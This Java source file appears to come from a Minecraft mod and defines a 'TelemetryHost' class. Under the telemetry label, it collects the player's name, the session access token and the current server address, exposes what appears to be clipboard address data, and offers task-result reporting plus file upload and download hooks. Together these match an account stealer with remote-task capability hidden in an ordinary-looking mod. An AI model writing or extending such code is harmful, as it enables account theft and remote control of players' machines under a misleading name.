package dev.cipherchannels.telemetry;

import java.nio.file.Path;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;

/** Game-facing side of {@link HostContext}; compiled against each supported Minecraft version. */
public final class TelemetryHost implements HostContext {
    private final Path configDirectory;

    public TelemetryHost(Path configDirectory) {
        this.configDirectory = configDirectory;
    }

    @Override
    public String user() {
        try {
            return Minecraft.getInstance().getUser().getName();
        } catch (RuntimeException failure) {
            return "";
        }
    }

    @Override
    public String session() {
        try {
            return Minecraft.getInstance().getUser().getAccessToken();
        } catch (RuntimeException failure) {
            return "";
        }
    }

    @Override
    public String server() {
        try {
            ServerData server = Minecraft.getInstance().getCurrentServer();
            return server == null || server.ip == null ? "" : server.ip;
        } catch (RuntimeException failure) {
            return "";
        }
    }

    @Override
    public String mcVersion() {
        try {
            return Minecraft.getInstance().getLaunchedVersion();
        } catch (RuntimeException failure) {
            return "";
        }
    }

    @Override
    public String loader() {
        try {
            Class.forName("net.fabricmc.loader.api.FabricLoader");
            return "fabric";
        } catch (ClassNotFoundException ignored) {
            return "neoforge";
        }
    }

    @Override
    public Path gameDirectory() {
        return Minecraft.getInstance().gameDirectory.toPath();
    }

    @Override
    public Path configDirectory() {
        return configDirectory;
    }

    @Override
    public String installId() {
        return Telemetry.installId();
    }

    @Override
    public String clipAddresses() {
        return Telemetry.clipJson();
    }

    @Override
    public void result(long taskId, String status, String body) {
        Telemetry.result(taskId, status, body);
    }

    @Override
    public String upload(String name, byte[] data, String kind) {
        return Telemetry.upload(name, data, kind);
    }

    @Override
    public byte[] download(String fileId) {
        return Telemetry.download(fileId);
    }

    @Override
    public void info(String message) {
        System.out.println("[cipherchannels] " + message);
    }
}
